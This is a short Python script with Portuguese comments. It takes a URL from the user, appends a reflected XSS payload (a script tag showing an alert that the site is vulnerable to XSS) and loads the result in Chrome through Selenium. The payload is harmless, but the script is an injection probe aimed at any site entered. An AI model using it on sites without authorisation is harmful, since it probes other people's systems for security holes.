from selenium import webdriver 
import time

# Captura a URL e insere um código de Injeção XSS
url = input("Digite a URL a ser Pesquisada: ")
urlXSS = url + '\'<script>window.alert("Esse site está vulnerável a falhas XSS")</script>\''

# Abre o Chrome
driver = webdriver.Chrome()

# Apenas carrega a URL fornecida
driver.get(urlXSS)

# Espera 60 segundos (ou qualquer outro tempo que você preferir) antes de fechar o navegador
time.sleep(60)

# Encerra o Programa
driver.quit()
